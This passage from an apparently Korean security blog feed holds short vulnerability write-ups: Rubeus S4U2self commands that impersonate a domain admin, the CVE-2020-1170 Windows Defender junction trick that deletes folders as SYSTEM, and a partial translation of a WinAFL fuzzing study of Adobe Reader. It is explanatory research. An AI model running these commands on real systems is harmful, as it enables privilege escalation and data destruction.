&#xC0AC;&#xC6A9;&#xD558;&#xC5EC; S4U2self&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xB3C4;&#xBA54;&#xC778; &#xAD00;&#xB9AC;&#xC790;&#xC5D0; &#xB300;&#xD55C; &#xD2F0;&#xCF13;&#xC744; &#xC694;&#xCCAD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs cmake">Invoke-Rubeus -<span class="hljs-keyword">Command</span> <span class="hljs-string">&quot;s4u /self /nowrap /impersonateuser:doadmin /ticket:base64blob&quot;</span></code></pre><p>&#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; S4U2self&#xB97C; &#xD1B5;&#xD574; &#xAC00;&#xC838;&#xC628; &#xD2F0;&#xCF13;&#xC758; SPN&#xC740; &#xD574;&#xCEE4;&#xAC00; &#xC2E4;&#xD589; &#xC911;&#xC778;  <code>Computername$</code>&#xC73C;&#xB85C; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC720;&#xD6A8;&#xD55C; SPN&#xC774; &#xC544;&#xB2C8;&#xBBC0;&#xB85C; &#xD2F0;&#xCF13;&#xC744; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC5C6;&#xC9C0;&#xB9CC;, <code>tgssub</code>&#xC640; <code>/altservice</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xD574;&#xB2F9; &#xBD80;&#xBD84;&#xC744; &#xC218;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cmake">Invoke-Rubeus -<span class="hljs-keyword">Command</span> <span class="hljs-string">&quot;tgssub /altservice:http/adsec-00.contoso.com /ticket:base64blob&quot;</span></code></pre><p>&#xADF8; &#xD6C4; &#xB2E4;&#xB978; &#xD638;&#xC2A4;&#xD2B8;&#xC5D0;&#xC11C; &#xD2F0;&#xCF13;&#xC744; &#xBCF5;&#xC0AC;&#xD574; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="https://cyberstoph.org/img/7_tgssub_ptt_2.png" alt="tgtdeleg"></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>lpe</tag>
      
      <tag>idioth</tag>
      
      <tag>kerberos</tag>
      
      <tag>s4u2self</tag>
      
      <tag>rubeus</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-1170 - Microsoft Windows Defender Elevation of Privilege Vulnerability</title>
    <link href="/2021/07/04/j0ker/2021-07-04/"/>
    <url>/2021/07/04/j0ker/2021-07-04/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://itm4n.github.io/cve-2020-1170-windows-defender-eop/">https://itm4n.github.io/cve-2020-1170-windows-defender-eop/</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows Defender</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows Defender&#xB294; &#xB450; &#xAC00;&#xC9C0; &#xB85C;&#xADF8; &#xD30C;&#xC77C;, <code>MpCmdRun.log</code>&#xC640; <code>MpSigStub.log</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294;&#xB370; &#xC774; &#xB458; &#xBAA8;&#xB450; <code>C:\Windows\Temp</code>&#xC5D0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. &#xC77C;&#xBC18; &#xC720;&#xC800; &#xAD8C;&#xD55C;&#xC5D0;&#xC11C;&#xB294; &#xC774; &#xB450; &#xD30C;&#xC77C;&#xC5D0; &#xB300;&#xD55C; Write &#xAD8C;&#xD55C;&#xC740; &#xC5C6;&#xC9C0;&#xB9CC; <code>C:\Windows\Temp</code>&#xC5D0; &#xC790;&#xC720;&#xB86D;&#xAC8C; &#xD30C;&#xC77C;&#xC774;&#xB098; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB450; &#xB85C;&#xADF8; &#xD30C;&#xC77C; &#xC911; <code>MpCmdRun.log</code> &#xD30C;&#xC77C;&#xC774; 16MB&#xBCF4;&#xB2E4; &#xCEE4;&#xC9C0;&#xBA74;, Windows Defender&#xB294; SYSTEM &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC758; &#xC774;&#xB984;&#xC744; <code>MpCmdRum.log.bak</code>&#xC73C;&#xB85C; &#xC218;&#xC815;&#xD558;&#xACE0; &#xAC19;&#xC740; &#xC774;&#xB984;&#xC758; &#xC0C8;&#xB85C;&#xC6B4; &#xD30C;&#xC77C;&#xC744; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; <code>MpCmdRun.log.bak</code>&#xC774; &#xC874;&#xC7AC;&#xD558;&#xACE0; &#xD3F4;&#xB354;&#xB77C;&#xBA74;, &#xD3F4;&#xB354; &#xC548;&#xC5D0; &#xC788;&#xB294; &#xD30C;&#xC77C;&#xB4E4;&#xACFC; &#xD574;&#xB2F9; &#xD3F4;&#xB354;&#xB97C; &#xC0AD;&#xC81C;&#xD558;&#xACE0; &#xB85C;&#xADF8; &#xD30C;&#xC77C;&#xC744; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xBA3C;&#xC800; &#xC6D0;&#xD558;&#xB294; <code>MpCmdRun.log.bak</code>&#xC774;&#xB77C;&#xB294; &#xC774;&#xB984;&#xC73C;&#xB85C; &#xC0AD;&#xC81C;&#xD558;&#xACE0; &#xC2F6;&#xC740; &#xD3F4;&#xB354;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; Junction &#xD3F4;&#xB354;&#xB97C; <code>C:\Windows\Temp</code>&#xC5D0; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. <code>Update-MpSignature -UpdateSource InternalDefinitionUpdateServer</code> &#xBA85;&#xB839;&#xC5B4;&#xB97C; 40&#xBD84; &#xB3D9;&#xC548; &#xBB34;&#xD55C;&#xBC18;&#xBCF5; &#xC2E4;&#xD589;&#xD558;&#xC5EC; <code>MpCmdRun.log</code>&#xAC00; 16MB&#xBCF4;&#xB2E4; &#xCEE4;&#xC9C0;&#xAC8C; &#xD558;&#xBA74; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xD2B8;&#xB9AC;&#xAC70; &#xB418;&#xC5B4; &#xC6D0;&#xD558;&#xB294; &#xD3F4;&#xB354; &#xBC0F; &#xADF8; &#xC544;&#xB798; &#xD30C;&#xC77C;&#xB4E4;&#xC744; &#xC9C0;&#xC6B8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>eop</tag>
      
      <tag>j0ker</tag>
      
      <tag>microsoft</tag>
      
      <tag>defender</tag>
      
      <tag>file_deletion</tag>
      
      <tag>directory_deletion</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Translation] 50 CVEs in 50 Days: Fuzzing Adobe Reader</title>
    <link href="/2021/07/04/fabu1ous/50cve/"/>
    <url>/2021/07/04/fabu1ous/50cve/</url>
    
    <content type="html"><![CDATA[<h1 id="&#xBC88;&#xC5ED;-&#xCD94;&#xC2E0;"><a href="#&#xBC88;&#xC5ED;-&#xCD94;&#xC2E0;" class="headerlink" title="&#xBC88;&#xC5ED; &#xCD94;&#xC2E0;"></a>&#xBC88;&#xC5ED; &#xCD94;&#xC2E0;</h1><p>WinAFL &#xC5F0;&#xAD6C;&#xAE00;&#xC744; &#xC4F0;&#xBA74;&#xC11C; &#xD0C0;&#xAC9F;&#xD568;&#xC218; &#xCC3E;&#xAE30; &#xC704;&#xD574; &#xBD84;&#xC11D;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC744; &#xC880; &#xB354; &#xACF5;&#xBD80;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC77D;&#xC740; &#xAE00;&#xC785;&#xB2C8;&#xB2E4;. &#xCC38; &#xC560;&#xB9E4;&#xD55C; &#xC8FC;&#xC81C;&#xC778; &#xAC8C; &#xD0C0;&#xAC9F; &#xBD84;&#xC11D;&#xC744; &#xB108;&#xBB34; &#xB9CE;&#xC774;&#xD558;&#xBA74; &#xD37C;&#xC9D5;&#xC744; &#xD558;&#xB294; &#xC758;&#xBBF8;&#xAC00; &#xC5C6;&#xC5B4;&#xC9C0;&#xACE0; &#xADF8;&#xB807;&#xB2E4;&#xACE0; &#xBD84;&#xC11D;&#xC744; &#xB108;&#xBB34; &#xC801;&#xAC8C; &#xD558;&#xBA74; Harness &#xC791;&#xC131; &#xBC0F; &#xD37C;&#xC9D5;&#xC744; &#xB3CC;&#xB9AC;&#xB294; &#xAC70; &#xC790;&#xCCB4;&#xAC00; &#xBC88;&#xAC70;&#xC6CC;&#xC9D1;&#xB2C8;&#xB2E4;. &#xADF8; &#xC0AC;&#xC774; &#xC5B4;&#xB518;&#xAC00; &#xC801;&#xC815; &#xC120;&#xC744; &#xCC3E;&#xB294; &#xAC83;&#xC774; &#xC911;&#xC694;&#xD55C;&#xB370; &#xC774; &#xAE00;&#xC774; &#xB3C4;&#xC6C0;&#xC774; &#xB420; &#xAC70;&#xB77C; &#xC0DD;&#xAC01;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xAE00;&#xC744; &#xB530;&#xB77C;&#xC11C; &#xC9C1;&#xC811; &#xC2E4;&#xC2B5;&#xD574;&#xBCF4;&#xACE0; &#xC7AC;&#xAD6C;&#xC131;&#xD55C; &#xC5F0;&#xAD6C;&#xAE00;&#xC744; &#xC5C5;&#xB85C;&#xB4DC;&#xD560; &#xC0DD;&#xAC01;&#xC774;&#xC5C8;&#xC9C0;&#xB9CC; &#xC885;&#xAC15; &#xAE30;&#xB150;&#xC73C;&#xB85C; &#xB180;&#xB2E4; &#xC640;&#xC11C; &#xC9C4;&#xB4DD;&#xD558;&#xAC8C; &#xC5F0;&#xAD6C;&#xAE00;&#xC744; &#xC4F8; &#xC2DC;&#xAC04;&#xC774; &#xC5C6;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#x314E;&#x314E; &#xADF8;&#xB798;&#xC11C; &#xC77C;&#xB2E8; &#xBC88;&#xC5ED;&#xAE00;&#xC744; &#xC62C;&#xB9BD;&#xB2C8;&#xB2E4;. &#xD604;&#xC7AC; &#xC5C5;&#xB85C;&#xB4DC; &#xC911;&#xC778; WinAFL &#xC2DC;&#xB9AC;&#xC988;&#xC758; &#xB2E4;&#xC74C; &#xAE00;&#xC740; &#xC774;&#xBC88; &#xBC88;&#xC5ED;&#xAE00;&#xC744; &#xC880; &#xB354; &#xAE4A;&#xAC8C; &#xACF5;&#xBD80;&#xD574;&#xBCF4;&#xACE0; &#xC791;&#xC131;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC6D0;&#xBCF8;&#xAE00; :  <a href="https://research.checkpoint.com/2018/50-adobe-cves-in-50-days/">https://research.checkpoint.com/2018/50-adobe-cves-in-50-days/</a></p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>2017&#xB144;&#xC5D0; &#xD070; &#xBCC0;&#xD654;&#xAC00; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8; &#xD574;&#xC5D0; &#xBCF4;&#xACE0;&#xB41C; &#xC0C8;&#xB85C;&#xC6B4; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC218;&#xB294; &#xC57D; 14,000&#xAC1C;&#xB85C;, &#xC804;&#xB144;&#xBCF4;&#xB2E4; &#xB450; &#xBC30; &#xC774;&#xC0C1; &#xB9CE;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC544;&#xB9C8; &#xADF8; &#xC774;&#xC720;&#xB294; &#xC790;&#xB3D9; &#xCDE8;&#xC57D;&#xC810; &#xD0D0;&#xC0C9; &#xD234;&#xC778; &#x201C;&#xD37C;&#xC800;&#x201D;&#xC758; &#xC778;&#xAE30;&#xAC00; &#xB192;&#xC544;&#xC84C;&#xAE30; &#xB54C;&#xBB38;&#xC77C; &#xAC81;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/07/04/fabu1ous/50cve/1.png" alt></p><p>&#xD37C;&#xC800; &#xC790;&#xCCB4;&#xB294; 20&#xB144; &#xC774;&#xC0C1; &#xC874;&#xC7AC;&#xD574; &#xC654;&#xACE0; &#xADF8;&#xB9AC; &#xC0C8;&#xB85C;&#xC6B4; &#xAE30;&#xC220;&#xC740; &#xC544;&#xB2D9;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC8FC;&#xBAA9;&#xD574;&#xC57C; &#xD560; &#xC0AC;&#xC2E4;&#xC740; &#xD37C;&#xC800;&#xB4E4;&#xC774; &#xBC1C;&#xC804;&#xD588;&#xB2E4;&#xB294; &#xAC81;&#xB2C8;&#xB2E4;. &#xADF8;&#xB4E4;&#xC740; &#xB354;&#xC6B1; &#xB6F0;&#xC5B4;&#xB09C; &#xAE30;&#xB2A5;&#xACFC; &#xC26C;&#xC6B4; &#xC811;&#xADFC;&#xC131;&#xC744; &#xAC00;&#xC9C0;&#xAC8C; &#xB410;&#xC73C;&#xBA70; &#xBB34;&#xC5C7;&#xBCF4;&#xB2E4; &#xC644;&#xC131;&#xB3C4;&#xAC00; &#xB192;&#xC544;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7FC;&#xC5D0;&#xB3C4; &#xBD88;&#xAD6C;&#xD558;&#xACE0;, &#xD37C;&#xC800;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC740; &#x201C;&#xC5B4;&#xB450;&#xC6B4; &#xC608;&#xC220;&#x201D;&#xC774;&#xB77C;&#xB294; &#xD3C9;&#xD310;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB9CE;&#xC740; &#xC5F0;&#xAD6C;&#xC790;&#xB4E4;&#xC740; &#xD37C;&#xC800;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC744; &#xAEBC;&#xB824;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC704;&#xC758; &#xBAA8;&#xB4E0; &#xAC83;&#xC744; &#xACE0;&#xB824;&#xD574; &#xBCFC; &#xB54C;, &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xC9C8;&#xBB38;&#xC744; &#xD574;&#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#x201C;&#xB354; &#xB9CE;&#xC740; &#xC5F0;&#xAD6C;&#xC790;&#xB4E4;&#xC774; &#xB354; &#xB9CE;&#xC740; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xAE30; &#xC704;&#xD574; &#xD37C;&#xC800;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC788;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; <em>&#xBAA8;&#xB4E0;</em> &#xC5F0;&#xAD6C;&#xC790;&#xB4E4;&#xC774; <em>&#xBAA8;&#xB4E0;</em> &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xAE30; &#xC704;&#xD574; &#xD37C;&#xC800;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC788;&#xC744;&#xAE4C;?&#x201D; &#x201C;FUZZ&#xB77C;&#xACE0; &#xC801;&#xD78C; &#xCEE4;&#xB2E4;&#xB780; &#xBC84;&#xD2BC;&#xC744; &#xB204;&#xB974;&#xAE30;&#xB9CC; &#xD558;&#xBA74; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xB294;, &#xAC70;&#xC800;&#xBA39;&#xC744; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xB4E4;&#xC774; &#xC5BC;&#xB9C8;&#xB098; &#xC788;&#xC744;&#xAE4C;?&#x201D;</p><p>&#xADF8; &#xB2F5;&#xC744; &#xC54C;&#xAE30; &#xC704;&#xD574;, &#xC800;&#xD76C;&#xB294; &#xC800;&#xD76C;&#xAC00; &#xC0DD;&#xAC01;&#xD560; &#xC218; &#xC788;&#xB294; &#xAC00;&#xC7A5; &#xD754;&#xD55C; &#xC2E4;&#xD5D8;&#xC744; &#xB9CC;&#xB4E4;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAC00;&#xC7A5; &#xC77C;&#xBC18;&#xC801;&#xC778; Windows &#xD37C;&#xC9D5; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C; &#xC911; &#xD558;&#xB098;&#xC778; WinAFL&#xACFC; &#xC138;&#xACC4;&#xC5D0;&#xC11C; &#xAC00;&#xC7A5; &#xC778;&#xAE30; &#xC788;&#xB294; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xC81C;&#xD488; &#xC911; &#xD558;&#xB098;&#xC778; Adobe Reader&#xB97C; &#xC0AC;&#xC6A9;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC800;&#xD76C;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xBD84;&#xC11D;&#xD558;&#xACE0;, &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC788;&#xC744; &#xB9CC;&#xD55C; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB97C; &#xCC3E;&#xC544; harness&#xB97C; &#xC791;&#xC131;&#xD558;&#xACE0;, &#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; &#xD37C;&#xC9D5; &#xB4F1; &#xC804;&#xCCB4; &#xC791;&#xC5C5;&#xC5D0; 50&#xC77C;&#xC758; &#xAE30;&#xAC04;&#xC744; &#xC124;&#xC815;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xACB0;&#xACFC;&#xB294; &#xB9E4;&#xC6B0; &#xCDA9;&#xACA9;&#xC801;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. 50&#xC77C; &#xB3D9;&#xC548; Adobe Reader&#xC5D0;&#xC11C; 50&#xAC1C; &#xC774;&#xC0C1;&#xC758; &#xC0C8;&#xB85C;&#xC6B4; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xBC1C;&#xACAC;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; &#xD558;&#xB8E8; &#xD3C9;&#xADE0; 1&#xAC1C;&#xC758; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C;, &#xC774;&#xB7EC;&#xD55C; &#xC720;&#xD615;&#xC758; &#xC5F0;&#xAD6C;&#xC5D0;&#xC11C;&#xB294; &#xD754;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xC18D;&#xB3C4;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xAE00;&#xC744; &#xD1B5;&#xD574; &#xD574;&#xB2F9; &#xC5F0;&#xAD6C;&#xC758; &#xC804;&#xB9D0;&#xC744; &#xC54C;&#xB824;&#xB4DC;&#xB9AC;&#xB824; &#xD569;&#xB2C8;&#xB2E4;. &#xAC80;&#xC0C9; &#xBC94;&#xC704;&#xB97C; &#xB113;&#xD788;&#xAE30; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xD55C; &#xC0C8;&#xB85C;&#xC6B4; &#xBC29;&#xBC95;&#xB860;, WinAFL&#xC744; &#xAC1C;&#xC120;&#xD55C; &#xBC29;&#xBC95;, &#xADF8;&#xB9AC;&#xACE0; &#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; &#xADF8; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC5BB;&#xC740; &#xC9C0;&#xC2DD;&#xC744; &#xACF5;&#xC720;&#xD558;&#xB824; &#xD569;&#xB2C8;&#xB2E4;.</p><h1 id="What-is-WinAFL"><a href="#What-is-WinAFL" class="headerlink" title="What is WinAFL?"></a>What is WinAFL?</h1><p>AFL&#xC740; coverage guided genetic fuzzer&#xB85C;, &#xC2E4;&#xC81C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xC11C; &#xBC84;&#xADF8;&#xB97C; &#xCC3E;&#xB294; &#xB370; &#xB9E4;&#xC6B0; &#xC601;&#xB9AC;&#xD55C; &#xD734;&#xB9AC;&#xC2A4;&#xD2F1;&#xC744; &#xAC16;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>WinAFL&#xC740; Windows&#xC6A9; AFL&#xB85C; Ivan Fratric(Google Project Zero)&#xC5D0; &#xC758;&#xD574; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9C0;&#xACE0; &#xAD00;&#xB9AC;&#xB418;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. Closed source &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xD0C0;&#xAC9F;&#xC73C;&#xB85C; &#xD55C; &#xC5EC;&#xB7EC; instrumentation&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC6B0;&#xC120; AFL&#xC774; &#xC5B4;&#xB5BB;&#xAC8C; &#xB3D9;&#xC791;&#xD558;&#xB294;&#xC9C0; &#xC790;&#xC138;&#xD558;&#xAC8C; &#xC801;&#xD600;&#xC788;&#xB294; AFL &#xAE30;&#xC220; &#xBB38;&#xC11C;&#xB97C; &#xC77D;&#xB294; &#xAC83;&#xC744; &#xCD94;&#xCC9C;&#xD569;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; &#xB2E8;&#xC810;&#xC744; &#xC9C0;&#xC801;&#xD558;&#xACE0; &#xBB38;&#xC81C;&#xAC00; &#xBC1C;&#xC0DD;&#xD588;&#xC744; &#xB54C; &#xB514;&#xBC84;&#xAE45;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xB3C4;&#xC640;&#xC90D;&#xB2C8;&#xB2E4;.</p><p>WinAFL&#xC740; &#xC555;&#xCD95; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xD615;&#xC2DD;(&#xC774;&#xBBF8;&#xC9C0;, &#xBE44;&#xB514;&#xC624;, &#xC544;&#xCE74;&#xC774;&#xBE0C;)&#xC758; &#xD30C;&#xC77C; &#xD3EC;&#xB9F7; &#xBC84;&#xADF8;&#xB97C; &#xCC3E;&#xB294;&#xB370; &#xB9E4;&#xC6B0; &#xD6A8;&#xACFC;&#xC801;&#xC785;&#xB2C8;&#xB2E4;.</p><h1 id="Attacking-Acrobat-Reader-DC"><a href="#Attacking-Acrobat-Reader-DC" class="headerlink" title="Attacking Acrobat Reader DC"></a>Attacking Acrobat Reader DC</h1><p>&#xC6B0;&#xC120; &#xBA54;&#xC778; &#xBC14;&#xC774;&#xB108;&#xB9AC; AcroRd32.exe&#xBD80;&#xD130; &#xC2DC;&#xC791;&#xD574; &#xBD05;&#xC2DC;&#xB2E4;.  AcroRD32.dll &#xC8FC;&#xBCC0;&#xC758; (&#xC0C1;&#xB300;&#xC801;&#xC73C;&#xB85C;) &#xC587;&#xC740; wrapper&#xC774;&#xBA70; &#xB300;&#xB7B5; 30MB&#xC785;&#xB2C8;&#xB2E4;. AcroRD32.dll&#xC740; &#xB9CE;&#xC740; &#xCF54;&#xB4DC;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xC911; &#xC77C;&#xBD80;&#xB294; PDF &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xC5D0; &#xB300;&#xD55C; &#xD30C;&#xC11C;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xACE0; &#xB300;&#xBD80;&#xBD84;&#xC740; GUI &#xCF54;&#xB4DC;(&#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; GUI &#xCF54;&#xB4DC;&#xC5D0;&#xC120; &#xBC84;&#xADF8;&#xB97C; &#xCC3E;&#xC9C0; &#xC54A;&#xC74C;)&#xC785;&#xB2C8;&#xB2E4;.</p><p>WinAFL&#xC740; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xD3EC;&#xB9F7;&#xC5D0; &#xD6A8;&#xACFC;&#xC801;&#xC774;&#xBBC0;&#xB85C; &#xD2B9;&#xC815; &#xD30C;&#xC11C;&#xB97C; &#xACF5;&#xACA9;&#xD558;&#xB294;&#xB370; &#xC9D1;&#xC911;&#xD558;&#xAE30;&#xB85C; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBB38;&#xC81C;&#xB294; &#xD30C;&#xC11C;&#xB97C; &#xCC3E;&#xC544;&#xC11C; &#xD30C;&#xC11C;&#xB97C; &#xC704;&#xD55C; harness&#xB97C; &#xC791;&#xC131;&#xD558;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. Harness&#xB780; &#xC815;&#xD655;&#xD788; &#xBB34;&#xC5C7;&#xC778;&#xC9C0; &#xC7A0;&#xC2DC; &#xD6C4;&#xC5D0; &#xC124;&#xBA85;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC804;&#xCCB4; Reader &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xB85C;&#xB4DC;&#xD558;&#xC9C0; &#xC54A;&#xACE0;&#xB3C4; &#xB85C;&#xB4DC;&#xD560; &#xC218; &#xC788;&#xB294; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xD3EC;&#xB9F7;&#xC758; &#xD30C;&#xC11C;&#xB97C; &#xCC3E;&#xC544;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>Acrobat&#xC758; &#xD3F4;&#xB354;&#xC5D0;&#xC11C; DLL&#xC744; &#xD0D0;&#xC0C9;&#xD55C; &#xACB0;&#xACFC; JP2KLib.dll&#xC774; &#xC774;&#xC0C1;&#xC801;&#xC778; &#xD0C0;&#xAC9F;&#xC784;&#xC744; &#xD655;&#xC778;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/07/04/fabu1ous/50cve/2.png" alt></p><p>JP2KLib.dll&#xC740; JPEG2000 &#xD3EC;&#xB9F7;&#xC758; &#xD30C;&#xC11C;&#xB85C; &#xC0C1;&#xB2F9;&#xD788; &#xC720;&#xC6A9;&#xD55C; &#xD568;&#xC218;&#xB97C; export &#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/07/04/fabu1ous/50cve/3.png" alt></p><p>&#xC774;&#xBC88; &#xC5F0;&#xAD6C;&#xC758; &#xD0C0;&#xAC9F;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Acrobat Reader DC &#x2264; 2018.011.238</p><p>JP2KLib.dll 1.2.2.39492</p><h1 id="What-is-a-Target-Function"><a href="#What-is-a-Target-Function" class="headerlink" title="What is a Target Function?"></a>What is a Target Function?</h1><p><a href="https://github.com/googleprojectzero/winafl#how-to-select-a-target-function">&#xD0C0;&#xAC9F;&#xD568;&#xC218;</a>&#xB294; WinAFL&#xC774; &#xD37C;&#xC9D5; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xC5D4;&#xD2B8;&#xB9AC; &#xD3EC;&#xC778;&#xD2B8;&#xB85C; &#xC0AC;&#xC6A9;&#xB41C;&#xB294; &#xD568;&#xC218;&#xB97C; &#xB73B;&#xD569;&#xB2C8;&#xB2E4;. fuzz_iteration &#xD69F;&#xC218;&#xB9CC;&#xD07C; &#xBC18;&#xBCF5; &#xD638;&#xCD9C;&#xB418;&#xBA70; &#xAC01; &#xC2E4;&#xD589;&#xB9C8;&#xB2E4; input &#xD30C;&#xC77C;&#xC744; &#xBBA4;&#xD14C;&#xC774;&#xD2B8;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD0C0;&#xAC9F; &#xD568;&#xC218;&#xB294;:</p><p>input &#xD30C;&#xC77C;&#xC744; &#xC5F4;&#xACE0;, &#xD30C;&#xC77C;&#xC744; &#xC77D;&#xACE0;, &#xD30C;&#xC77C;&#xC744; &#xD30C;&#xC2F1; &#xD55C; &#xD6C4; &#xB2EB;&#xC544;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>C++ exception &#xD639;&#xC740; TermainateProcess&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xB9AC;&#xD134;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB7F0; &#xD568;&#xC218;&#xB97C; &#xCC3E;&#xAE30;&#xB780; &#xC27D;&#xC9C0; &#xC54A;&#xACE0; 